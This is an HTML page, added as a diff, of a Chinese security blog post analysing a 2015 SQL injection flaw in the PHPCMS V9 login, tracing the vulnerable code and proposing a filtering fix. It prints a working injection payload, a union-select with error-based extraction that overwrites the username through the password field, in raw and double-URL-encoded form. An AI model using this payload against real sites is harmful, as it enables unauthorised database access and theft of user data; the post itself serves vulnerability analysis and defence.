@@ -1,0 +1,381 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>PHPCMS V9 SQL注入漏洞 | Brickの小黑屋</title>
+
+<link rel="shortcut icon" href="https://brick713.github.io/favicon.ico?v=1749001692545">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://brick713.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-73319140-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-73319140-1');
+</script>
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Brickの小黑屋
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1749001692545"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    PHPCMS V9 SQL注入漏洞
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2015-09-21 ·
+                    </time>
+                    
+                        <a href="https://brick713.github.io/WgbtwK_Qkc/" class="post-tags">
+                            # 漏洞分析
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="0x00-漏洞描述">0x00 漏洞描述</h1>
+<p>在PHPCMS V9版本（最新版本）的登录功能中，存在SQL注入漏洞，登录界面通过POST传入的data内容，解析其中的内容会作为注册、登陆、删除用户等操作的内容依据，而这些操作都会将这些数据作为数据库查询语句使用。因为代码没有做过滤，攻击者可以利用POST内容进行SQL注入。</p>
+<!-- more -->
+<h1 id="0x01-漏洞成因">0x01 漏洞成因</h1>
+<p>总结来说漏洞的成因主要是以下两点：</p>
+<p>1.<em>POST内容用来进行数据库查询</em></p>
+<p>2.<em>5.3版本之后的PHP配置默认关闭GPC</em></p>
+<blockquote>
+<p>gpc 是PHP的一个防止SQL注入的转义机制。所有的全局变量会被php的函数mysql magic_quotes_gpc进行编码，把一些特殊字符例如‘，“，,NULL等等，加上反斜线\，从而避免sql注入.在PHP的配置中可以开启该功能。</p>
+</blockquote>
+<h1 id="0x02-漏洞代码分析">0x02 漏洞代码分析</h1>
+<p>下面通过PHPCMS的源码来分析在文件中漏洞成因。</p>
+<blockquote>
+<p>\phpcms\modules\member\index.php</p>
+</blockquote>
+<pre><code>$username = isset($_POST['username']) &amp;&amp; is_username($_POST['username']) ? trim($_POST['username']) : showmessage(L('username_empty'), HTTP_REFERER);
+$password = isset($_POST['password']) &amp;&amp; trim($_POST['password']) ? trim($_POST['password']) : showmessage(L('password_empty'), HTTP_REFERER);
+$cookietime = intval($_POST['cookietime']);
+$synloginstr = ''; //同步登陆js代码
+            
+if(pc_base::load_config('system', 'phpsso')) 
+{
+$this-&gt;_init_phpsso();
+//通过client的ps_member_login方法传入$username、$password获取一段数据
+$status = $this-&gt;client-&gt;ps_member_login($username, $password);
+$memberinfo = unserialize($status);
+</code></pre>
+<p><strong>注意这段PHP代码中，username使用的is_username进行了过滤而password没有做任何处理。</strong></p>
+<p>is_username(）这个函数的功能是检查用户名是否符合规定，是PHPCMS中的一个检查机制。具体代码如下：</p>
+<pre><code>
+/**
+ * 检查用户名是否符合规定
+ *
+ * @param STRING $username 要检查的用户名
+ * @return 	TRUE or FALSE
+ */
+function is_username($username) {
+	$strlen = strlen($username);
+	if(is_badword($username) || !preg_match(&quot;/^[a-zA-Z0-9_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]+$/&quot;, $username)){
+		return false;
+	} elseif ( 20 &lt; $strlen || $strlen &lt; 2 ) {
+		return false;
+	}
+	return true;
+}
+
+</code></pre>
+<p>Login对变量进行了处理之后将变量创给了ps_member_login函数<br>
+继续跟进ps_member_login和_ps_send函数</p>
+<pre><code>/**
+* 用户登陆
+* @param string $username 	用户名
+* @param string $password 	密码
+* @param int $isemail	email
+* @return int {-2;密码错误;-1:用户名不存在;array(userinfo):用户信息}
+*/
+public function ps_member_login($username, $password, $isemail=0) {
+	if($isemail) {
+		if(!$this-&gt;_is_email($username)) {
+			return -3;
+		}
+		$return = $this-&gt;_ps_send('login', array('email'=&gt;$username, 'password'=&gt;$password));
+	} else {
+		$return = $this-&gt;_ps_send('login', array('username'=&gt;$username, 'password'=&gt;$password));
+	}
+	return $return;
+}
+private function _ps_send($action, $data = null) 
+{
+    return $this-&gt;_ps_post($this-&gt;ps_api_url.&quot;/index.php?m=phpsso&amp;c=index&amp;a=&quot;.$action, 500000, $this-&gt;auth_data($data));
+}
+</code></pre>
+<p>通过ps_member_login方法获取一段数据之后，再由_ps_send向phpsso发送http包的post数据，phpsso认证完成后，将用户的信息返回给member的login送入数据库进行查询处理。</p>
+<p>这里基本上还原了PHPCMS对数据的处理，总结下基本流程：</p>
+<ol>
+<li>登录用户提交用户名和密码给menber的login</li>
+<li>然后member的login通过ps_member_login构造发送phpsso请求login验证的http包，并且将用户名和密码作为post数据.</li>
+<li>phpsso认证完成后，将用户的信息返回给member的login进行后续处理</li>
+<li>在整个认证过程中，password没有做任何处理就直接传入phpsso，phpsso没有对于解码数据进行过滤。</li>
+</ol>
+<h1 id="0x03-攻击方法">0x03 攻击方法</h1>
+<h2 id="编码绕过">编码绕过</h2>
+<p>password字段如果存在特殊字符，在传入到程序时仍然会被转义，针对这个问题可以使用二次url编码的方法来搞定。所以，我们只需要在传password内容时传递%2527就可以让单引号出现在phpsso的变量中了。</p>
+<h2 id="数据查询">数据查询</h2>
+<p>在phpsso的login中使用的是username做数据库查询，而不是passwod。而username是经过处理的，因此我们需要想法构造password让他具有查询的能力。</p>
+<p>这里需要看PHPCMS是如何处理URL中的POST变量的。</p>
+<pre><code>if(isset($_POST['data'])) 
+{
+parse_str(sys_auth($_POST['data'], 'DECODE', $this-&gt;applist[$this-&gt;appid]['authkey']), $this-&gt;data);
+    if(empty($this-&gt;data) || !is_array($this-&gt;data)) {
+        exit('0');
+        }
+} 
+    else {
+        exit('0');
+}
+</code></pre>
+<p>这里POST数据使用了parse_str函数进行处理。它的功能是解析出POST数据中的变量值。<br>
+例如：</p>
+<pre><code>&lt;?php
+parse_str(&quot;id=23&amp;name=John%20Adams&quot;);
+echo $id.&quot;&lt;br /&gt;&quot;;
+echo $name;
+?&gt;
+</code></pre>
+<p>输出：</p>
+<blockquote>
+<p>23<br>
+John Adams</p>
+</blockquote>
+<p>当我们的数据为“username=123&amp;password=456”这样的字符串，会把它解析为：</p>
+<blockquote>
+<p>Array(<br>
+username=&gt;123,<br>
+password=&gt;456<br>
+)</p>
+</blockquote>
+<p>但是这个函数存在解析问题，如果我们构造字符串成“usernamen=123&amp;password=456&amp;username=789”，他就会被解析为：</p>
+<blockquote>
+<p>Array(<br>
+username=&gt;789,<br>
+password=&gt;456<br>
+}</p>
+</blockquote>
+<p>那这样我们的利用思路就有了：将”&amp;username=”进行url编码后作为password的值用于在phpsso中覆盖之前的username值，在“&amp;username=”后面添加进行两次url编码的SQL语句，构造出来的POST数据如下：</p>
+<blockquote>
+<p>usernmae=phpcms&amp;password=%26username%3d%2527</p>
+</blockquote>
+<p>通过这样的方法，我们绕过了username的检测，利用password提交了注入数据，现在我们来提交一段复杂的代码：</p>
+<pre><code>username=phpcms&amp;password=123456&amp;username=' union select '2','test\',updatexml(1,concat(0x5e24,(select user()),0x5e24),1),\'123456\',\'\',\'\',\'\',\'\',\'\',\'2\',\'10\'),(\'2\',\'test','5f1d7a84db00d2fce00b31a7fc73224f','123456',null,null,null,null,null,null,null,null,null#
+</code></pre>
+<p>经过编码后变成：</p>
+<pre><code>username=phpcms&amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523
+</code></pre>
+<h1 id="0x04-防御方法">0x04 防御方法</h1>
+<p>添加过滤代码，最好的方式应该是将转义和过滤放在数据库操作的前一步，这样可以极有效缓解SQL注入带来的问题。</p>
+<pre><code>\phpcms\modules\member\index.php
+
+$username = isset($_POST['username']) &amp;&amp; is_username($_POST['username']) ? trim($_POST['username']) : showmessage(L('username_empty'), HTTP_REFERER);
+//$password = isset($_POST['password']) &amp;&amp; trim($_POST['password']) ? trim($_POST['password']) : showmessage(L('password_empty'), HTTP_REFERER);
+/* 过滤、转义 */
+$password = isset($_POST['password']) &amp;&amp; trim($_POST['password']) ? addslashes(urldecode(trim($_POST['password']))) : showmessage(L('password_empty'), HTTP_REFERER);
+/**/
+
+</code></pre>
+<h1 id="0x05-另一种玩法">0x05 另一种玩法</h1>
+<p>如果能拿到auth_key的话可以通过auth_key进行注入，具体方法请参考：</p>
+<p><a href="https://0x9.me/7CeWU">PHPCMS V9 一个为所欲为的漏洞</a></p>
+<h1 id="尾巴">尾巴</h1>
+<p>这个洞利用不太方便，官方已经修复了漏洞，而且必须是<strong>PHP5.3</strong>才能利用。</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://brick713.github.io/an-quan-gong-ju-shou-ji/" class="post-title gt-a-link">
+                    安全工具收集
+                </a>
+            </div>
+        
+
+        
+            <span id="/phpcms-v9-sql-zhu-ru-lou-dong//" class="leancloud_visitors" data-flag-title="PHPCMS V9 SQL注入漏洞">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'BPVmDnJ3m7hNIrMMJze0YXAt-gzGzoHsz',
+		appKey: '9VgKRlxWNsjLGNJsxQycFcRE',
+		avatar: 'wavatar',
+		pageSize: 10,
+		recordIp: true,
+		placeholder: '',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">Home is Where Your Wifi Connects Automatically</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/brick713" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://twitter.com/YuppiesBrick" target="_blank">
+                    <i class="fab fa-twitter gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://weibo.com/brick123" target="_blank">
+                    <i class="fab fa-weibo gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+                <a href="https://www.zhihu.com/people/brick713" target="_blank">
+                    <i class="fab fa-zhihu gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        May The Force Be With You
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://brick713.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
